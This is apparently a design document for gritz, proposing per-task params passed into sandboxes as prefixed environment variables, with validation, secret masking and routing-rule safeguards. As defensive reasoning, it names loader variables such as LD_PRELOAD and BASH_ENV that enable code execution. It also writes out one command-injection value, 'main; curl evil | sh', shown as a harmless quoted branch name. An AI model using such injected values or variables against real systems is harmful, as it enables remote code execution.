Task params as sandbox environment variables

Issue: https://github.com/gritzapp/gritz/issues/2215

Problem

Section titled “Problem”

Some workspaces need a per-task value inside the sandbox. A workspace that runs a user-supplied process agent needs to know which Jira story a given task is for; a workspace that clones “the repo this task is about” needs the repo.

Today the only per-task input is the instruction text, and a process agent only sees it as the rendered prompt on stdin. A workspace’s container.environment, lambda_microvm.environment and secrets: are fixed per workspace. So the only ways to vary such a value are one workspace per value, or parsing it out of the prompt.

Design

Section titled “Design”

CreateTask gains params map<string,string>. The server validates them against the params the workspace declares, stores them on the task, and the runner injects each one into the run’s environment as GRITZ_PARAM_<NAME>. Params are not substituted into workspace config: there is no templating. They travel to the driver in the run spec the same way secrets: do (non-secret ones in RunSpec.env, secret ones in RunSpec.secrets), so the driver needs no new code and secret params are masked in the shipped log by the mechanism that already masks workspace secrets.

A workspace that wants a Jira story key:

The sandbox’s run environment then carries GRITZ_PARAM_JIRA_ISSUE=APP-142, GRITZ_PARAM_BRANCH=main and no GRITZ_PARAM_DEPLOY_TOKEN (not set, not required, no default).

Naming and collisions

Section titled “Naming and collisions”

A task’s params come from whoever can create it, which is a wider audience than whoever writes workspaces.yaml (see Who sets params). Raw names would let a task set PATH, LD_PRELOAD, NODE_OPTIONS, GIT_SSH_COMMAND or BASH_ENV, or shadow a workspace’s environment: or secrets: entry (GH_TOKEN), or the runner’s own GRITZ_TOKEN. Each of those is code execution or credential substitution inside the sandbox.

Three ways to close that, and the choice:

Option Collision-free Operator effort Verdict
Raw names, reject a denylist (PATH, LD_*, …) and anything colliding with the workspace’s env/secrets Only as good as the denylist; every runtime adds new loader variables None Rejected
Workspace declares each param and the variable it maps to (env: JIRA_ISSUE) Yes, if load-time validation checks the mapping against env, secrets and the runner’s variables One line per param Rejected for v1
Fixed prefix: param NAME is always GRITZ_PARAM_NAME Yes, by construction None Chosen

Every param is the environment variable GRITZ_PARAM_<NAME>. No param can reach any variable outside that prefix, whatever the caller sends, so no denylist has to be complete. Workspace.Validate reserves the prefix: an environment: entry (either backend’s) or a secrets: entry whose name starts with GRITZ_PARAM_ is a config error, so nothing else in the run environment can collide with a param either. buildSpecs asserts that invariant with a panic rather than resolving a collision.

The mapping option is not wrong, just unnecessary for v1: a tool that insists on its own variable name can be wrapped (env JIRA_ISSUE="$GRITZ_PARAM_JIRA_ISSUE" story-agent as the process command). It can be added later as an optional env: on the declaration without changing anything else here.

Names match ^[A-Z][A-Z0-9_]{0,63}$: uppercase, so the param name and the variable suffix are the same string and foo/FOO can’t be two params that map to one variable; a leading letter, so the variable is a valid shell identifier. The rule is checked in one place (taskparam.ValidName), used by Workspace.Validate on the runner and by the server on every write path.

Values are at most 4 KiB, contain no NUL byte (the one byte an environment value can’t hold), and a task has at most 32 params. Values are otherwise opaque: newlines and shell metacharacters are allowed, since the environment carries them as data (see Reach).

Declared params only

Section titled “Declared params only”

A workspace declares its params under params:, keyed by name:

Field Meaning
description Shown in the web UI’s new-task form and in gritz workspaces.
required Creating a task without it fails.
default Used when the caller doesn’t set it. Not allowed with required or secret.
pattern An RE2 regexp the whole value must match (anchored). The default must match too. Required for a param a routing rule fills from an event.
secret The value is write-only in the API and masked in the shipped log.

An undeclared param is an error (InvalidArgument: workspace "story-agent" declares no param "JIRA"), as is a missing required one or a value that doesn’t match its pattern. Allowing undeclared params was considered and rejected: the server couldn’t know which values are secret, a typo (JIRA_ISUE) would silently produce a task whose agent sees nothing, and the web UI couldn’t render a form. Declaring a param costs one config line; a workspace with no params: accepts none.

The runner already sends the server its workspaces with RegisterWorkspaces; RegisteredWorkspace gains the declarations, and the server stores them in a new workspaces.params column. The server resolves params once, when the task is created: it rejects undeclared, missing-required and non-matching values, fills in defaults, records which are secret, and stores the result. The stored set is complete, so the runner injects exactly what the task carries and never consults its own declarations at run time.

That makes the creation-time declaration authoritative for a task’s life. A runner restarted with a changed params: affects new tasks only: an existing task keeps its params, including one the workspace no longer declares, and a task created before a new required param was added runs without it. Params are immutable after creation, like namespace: UpdateTask can’t change them, and a restart reruns with the same values. Rechecking at run time would turn a config edit into failed restarts of existing tasks for no gain.

Missing params. A declared, non-required param without a default that the caller didn’t set is absent from the task, and its variable is unset in the sandbox (not set to the empty string), so ${GRITZ_PARAM_X:-fallback} and [ -n "${GRITZ_PARAM_X+x}" ] behave as a reader expects. An explicit empty string is a value, kept as such, and must still match pattern.

Reach

Section titled “Reach”

Params are added to the run’s environment, the one the driver builds with driverserver.Env (the driver process’s environ, then RunSpec.env, then RunSpec.secrets) and passes to:

  • Setup commands:. The driver runs each with sh -c and the run environment, on the first run of the sandbox (resuming after the last completed command on a restart; see resume setup from failed command). Params are immutable and present from the first run, so commands: can use them: git clone --branch "$GRITZ_PARAM_BRANCH" ... works, and a command re-run on a restart sees the same value. Referencing a param by variable is also the safe form: the shell expands "$GRITZ_PARAM_BRANCH" as one word of data, never as shell syntax, so a value of main; curl evil | sh is a (bad) branch name, not a command. Unquoted, it is still word-split and globbed, so the docs show the quoted form.
  • The agent CLI (Claude Code, Codex, process, …) and everything it spawns: its tool calls, and stdio MCP servers that inherit the environment.
  • The agent’s cwd, which the driver already expands against the run environment (envx.Expand(cfg.Cwd, d.Env)), so cwd: /work/$GRITZ_PARAM_REPO works.

Params do not reach:

  • Anything the runner expands when it loads workspaces.yaml: ${env:} and ${sh:} run on the runner host before any task exists, and the image, volumes, mcp_servers entries and other config fields are fixed per workspace. That is the “no templating” line.
  • The sandbox’s own process environment: the driver process, the container’s entrypoint, and gritz shell sessions, which today don’t get the run environment either (secrets included). Inside a shell, cat /proc/<agent pid>/environ finds them, the same as for secrets.

Who sets params

Section titled “Who sets params”

Every path that creates a task resolves params through the same server-side function, taskparam.Resolve, against the workspace’s stored declarations.

Path How Secret params
CreateTask RPC params (field 9). Yes
MCP create_task (gritz mcp, server MCP) params object of string to string. Yes
gritz task create --param NAME=VALUE, repeatable. Yes; --param NAME=@file reads the value from a file (@- for stdin), so it stays out of shell history and ps.
Web UI new-task page One field per declared param of the selected workspace, from ListWorkspaces: description as help text, required marked, default as placeholder, secret as a password field. Yes
Schedules Schedule.params, fixed values set when the schedule is saved, validated then and again on each fire. No
Routing rules CreateTaskAction.params: a literal value, or a key of the event’s details. No

Schedules and rules can’t set secret params. Their values are stored in the schedule row or the rule JSON and returned to every org member by ListSchedules and GetRoutingRules; a value fixed per schedule or rule is a workspace secret anyway and belongs in secrets:. Saving a schedule or rule that sets a secret param is InvalidArgument.

Routing rules and outsiders. A rule’s params are either a literal (value) or copied from the triggering event’s details (detail: "story"). The second is what makes params useful for routed tasks (a custom event carrying {"details": {"story": "APP-142"}}), and it is also an outsider’s input: custom-event rules must be public, a custom event can be posted by any system holding an org API key (often a relay of a third party’s webhook), and public GitHub rules fire for comments by anyone on an installed repository, whose details (path, side, …) come from the event too.

Environment injection already removes the worst outcome: the prefix means an outsider can only set a GRITZ_PARAM_ variable, and the shell treats its value as data. What remains is the value’s meaning, which the operator’s commands and agent decide (which branch is checked out, which story is worked). So:

  • A rule may fill a param from details only if the workspace declares a pattern for it. The server rejects saving a rule that maps an event detail into a param without one, and enforces the pattern on every fired value. A pattern is the operator’s statement of what any sender may choose ([A-Z][A-Z0-9]+-[0-9]+, [a-z0-9-]{1,40}); a free-form param can still be set by members through the other paths.
  • A detail the event doesn’t carry leaves the param unset, so the default or the required check applies.
  • A resolution failure creates no task. Route returns a *taskparam.Error, which the custom webhook answers with 400 param "STORY": value "x" does not match pattern ...; GitHub and Jira webhooks log it, as they log other routing failures. Only the create branch can fail this way: waking subscribed tasks never touches params.

Rules map from details and not from attrs because details is the single-valued, free-form part of an event meant for context, and custom event types already let senders put anything there; attrs are lists shaped for matching.

Masking

Section titled “Masking”

A param declared secret: true:

  • Is write-only in the API. Task.params lists it with secret set and an empty value in every response (GetTask, ListTasks, get_my_task, notifications), the same audience that reads the shipped log, so masking the log alone would be pointless. Only CreateTaskToken returns its value. That RPC needs OpTaskTokenCreate, which runner keys hold and task tokens don’t; an org member with the wildcard scope can call it too, but can also gritz shell into the sandbox and read the value there, so this is no wider than the sandbox’s own trust boundary.
  • Reaches the mask through RunSpec.secrets. The runner puts secret params in backend.Spec.Secrets (and from there RunSpec.secrets) under their variable name, next to the workspace’s secrets. The driver already adds RunSpec.secrets to the run environment and hands them to the log shipper’s redact.Writer before the first shipped byte, so the value appears in the shipped log as [gritz:masked GRITZ_PARAM_DEPLOY_TOKEN]. No driver change.

The secret flag is recorded on the task when it is created, from the declaration then in force, and it is what both the API and the runner use. A later edit that drops secret: from a declaration can’t expose an existing task’s value.

Secret values are stored in Postgres in plain text, like the instructions and event payloads beside them; unlike workspace secrets they have to be, since the server is where they enter. See Open Questions.

Non-secret params are not masked. They are as visible as the instruction text.

Storage

Section titled “Storage”
  • tasks.params: the resolved [{"name", "value", "secret"}], sorted by name. Added to the CreateTask insert and the GetTask, GetTaskForUpdate, ListTasks and ListTasksPage selects. Never updated.
  • workspaces.params: the declarations as registered, written by RegisterWorkspaces (which already replaces a runner’s rows wholesale).
  • schedules.params: the schedule’s {name: value} as saved.
  • Routing rules are stored as JSON already; CreateTaskAction gains a field and needs no migration.

A param is never queried by name, so a JSON column beats a task_params table.

Proto

Section titled “Proto”

The params ride on CreateTaskTokenResponse rather than a separate runner RPC because the runner already calls it for every spec it builds (TaskManager.specs), the handler already loads the task row, and it is the RPC that already returns a task’s sandbox credentials under a scope task tokens don’t hold. GetTask can’t serve: it blanks secret values for everyone.

driver.v1.RunSpec is unchanged apart from its comments: env also carries non-secret params, secrets also carries secret ones.

API

Section titled “API”

How it fits: the runner’s RegisterWorkspaces sends each workspace’s ParamDecls; the server stores them. CreateTask, the MCP create_task tool (through the RPC), scheduler.Fire and eventrouter.Router.create each call store.GetWorkspaceParams and taskparam.Resolve (the router first turns the rule’s ParamValues and the event’s details into the given map) and store the result on model.Task. SetRoutingRules and the schedule handlers validate against the same declarations on save. The server’s task-to-proto conversion blanks secret values; CreateTaskToken doesn’t. TaskManager.specs passes the token response’s params to buildSpecs, which adds non-secret ones to Spec.Env and secret ones to Spec.Secrets under taskparam.Env(name), panicking if either key is already present.

Implementation Plan

Section titled “Implementation Plan”
  1. taskparam package — Delivers: ValidName, Env, Decl.Validate, Resolve, Error. Depends on: nothing. Verifiable by: table tests over names, undeclared/missing/default/pattern/limit cases and secret flags.
  2. Workspace params: — Delivers: ParamConfig, Workspace.Params, ParamDecls, validation including the reserved prefix in environment: and secrets:; gritz workspaces prints declarations. Depends on: (1). Verifiable by: workspace config tests; a config with a declared param loads, one with a GRITZ_PARAM_ env entry doesn’t. Nothing reads params yet.
  3. Migration + proto + store — Delivers: the three columns, the proto messages and fields above, model.Task.Params, the store read/write of tasks.params and workspaces.params, RegisterWorkspaces storing declarations, and the runner sending them. Depends on: (2). Verifiable by: migration up/down; store round-trip tests; ListWorkspaces returns the declarations after a runner registers.
  4. CreateTask and CreateTaskToken — Delivers: GetWorkspaceParams replacing HasWorkspace in CreateTask, resolution, secret blanking in every task response, params on CreateTaskTokenResponse. Depends on: (3). Verifiable by: apiserver tests for each rejection, defaults, and a secret value absent from GetTask but present in CreateTaskToken.
  5. Runner injection — Delivers: specInput.Params, buildSpecs adding params to Spec.Env/Spec.Secrets, driver.proto comments. Depends on: (4). Verifiable by: spec_test.go cases; an e2e test with the dummy agent running env that sees GRITZ_PARAM_X and finds a secret param masked in the shipped log.
  6. CLI and MCP — Delivers: gritz task create --param (with @file), params on the server MCP create_task tool, params in get_my_task output. Depends on: (4). Verifiable by: command and MCP handler tests.
  7. Web UI: new task and task page — Delivers: param fields on tasks.new.tsx from the selected workspace’s declarations; params shown on the task page, secret ones as ••••. Depends on: (4). Verifiable by: creating a task against the dev stack.
  8. Schedules — Delivers: schedules.params read/write, validation on save (no secret params) and in scheduler.Fire, the schedule form fields. Depends on: (4), (7) for the shared form component. Verifiable by: scheduler tests firing a schedule with params; RunSchedule against the dev stack.
  9. Routing rules — Delivers: CreateTaskAction.params, ParamValue, save-time validation (declared, not secret, detail only with a pattern), resolution in Router.create, the custom webhook’s 400, the rule form fields. Depends on: (4). Verifiable by: eventrouter tests (literal, detail, missing detail, pattern mismatch) and a custom event posted to the dev stack creating a task with the param set.
  10. Docs — each slice above updates its own pages; this lists them:

    • operators/secrets: secret params, how they are masked, and that schedules and rules can’t set them.
    • concepts/tasks: a “Params” section (set at creation, immutable, where they appear).
    • concepts/workspaces: declared params in “Picking a workspace”.
    • reference/cli, using/cli: --param.
    • integrations/mcp: create_task’s params.
    • using/agent-tools: params in get_my_task.
    • using/web-ui: param fields on the new-task page.
    • concepts/schedules: params on a schedule.
    • concepts/routing-rules (“Creating tasks”), integrations/custom-events (mapping details into a param, with a pattern), reference/custom-event-envelope (details can feed params; the new 400).
    • reference/api picks up the proto comments on its own.

Trade-offs

Section titled “Trade-offs”

${param:name} workspace templating (rejected here; #2217 designs it). Substituting params into workspace config would let them reach fields the environment can’t: the image, volumes, mcp_servers arguments, capabilities. The cost is that the substitution is textual: a param spliced into a commands: string is shell syntax, so every value needs quoting rules gritz has to get right, and a public rule mapping an event detail into a command becomes command injection. The config also stops being a fixed thing the runner validates once at load: each task’s effective workspace has to be expanded and validated (and the image pulled) per task. Environment variables keep the config static and the values data, at the cost of reaching only processes the run environment reaches.

Separate RunSpec.params field. The driver could get params in their own field and apply the prefix itself. Splitting them across env and secrets instead reuses the driver’s existing layering and masking unchanged, keeps the prefix rule in one place on the runner side, and ships with no driver change.

Resolve at run time on the runner. The runner could apply defaults and check required params from its own config at each start, making workspaces.yaml authoritative for every run. It would turn a config edit into failures of existing tasks, leave the server unable to reject a bad request at CreateTask, and leave the API without a way to know which values to blank.

Params as instruction events. Storing params as an event in the task’s stream would put them in the timeline and in the runner’s replica for free, but events are readable by everyone who can read the task, which rules out secret params, and the runner would have to fold them out of the stream.

Open Questions

Section titled “Open Questions”
  • Secret retention. Secret param values sit in tasks.params for the task’s life. Should archiving a task clear them (it can’t run again without unarchiving, and a restart after unarchive would then run without them)?
  • Param-only tasks from rules. Should a rule be able to fill a param from a built-in event’s attributes (e.g. a Jira event’s issue key), or is details enough until someone needs it?
  • Showing params to the agent in the first-run brief. This proposal adds them to get_my_task only. A process agent reads the environment, and Claude Code can run env; is a line in the brief worth the prompt churn?
